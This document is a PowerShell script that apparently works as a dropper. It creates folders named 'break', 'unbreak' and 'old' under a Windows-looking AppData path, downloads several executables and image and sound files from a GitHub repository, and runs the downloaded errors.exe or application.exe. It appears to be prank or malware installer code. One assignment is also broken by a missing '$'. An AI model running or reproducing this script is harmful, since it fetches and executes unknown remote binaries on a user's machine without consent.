$readmePath = Join-Path -Path $env:USERPROFILE -ChildPath "README.txt"
if (Test-Path -Path $readmePath) {
    exit
}

$noPath = Join-Path -Path $env:USERPROFILE -ChildPath "NO.txt"
if (Test-Path -Path $noPath) {
    $applicationExePath = Join-Path -Path $env:USERPROFILE -ChildPath "AppData\Windows\old\application.exe"
    & $applicationExePath
    exit
}

basePath = Join-Path -Path $env:USERPROFILE -ChildPath "AppData\Windows"

function Ensure-Directory {
    param (
        [string]$Path
    )
    if (-not (Test-Path -Path $Path)) {
        New-Item -Path $Path -ItemType Directory | Out-Null
    }
}

$foldersToCreate = @("break", "unbreak", "old")
foreach ($folder in $foldersToCreate) {
    $fullPath = Join-Path -Path $basePath -ChildPath $folder
    Ensure-Directory -Path $fullPath
}

$oldSubFolders = @("Desktop", "background")
foreach ($subFolder in $oldSubFolders) {
    $fullPath = Join-Path -Path "$basePath\old" -ChildPath $subFolder
    Ensure-Directory -Path $fullPath
}

Ensure-Directory -Path "$basePath\unbreak\app"

Ensure-Directory -Path "$basePath\break\sounds"

$filesToDownload = @{
    "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/unbreak/app/a1.exe" = "$basePath\unbreak\app\a1.exe"
    "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/old/@break.exe" = "$basePath\old\@break.exe"
    "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/old/application.exe" = "$basePath\old\application.exe"
    "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/old/errors.exe" = "$basePath\old\errors.exe"
    "https://raw.githubusercontent.com/webntdev/webntdev.github.io/main/Windows/old/background/default.jpg" = "$basePath\old\background\default.jpg"
    "https://raw.githubusercontent.com/webntdev/webntdev.github.io/main/Windows/old/background/screenshot.png" = "$basePath\old\background\screenshot.png"
    "https://github.com/webntdev/webntdev.github.io/raw/main/Windows/break/sounds/map.mp3" = "$basePath\break\sounds\map.mp3"
}

foreach ($url in $filesToDownload.Keys) {
    $destinationPath = $filesToDownload[$url]
    Invoke-WebRequest -Uri $url -OutFile $destinationPath
}

& "$basePath\old\errors.exe"
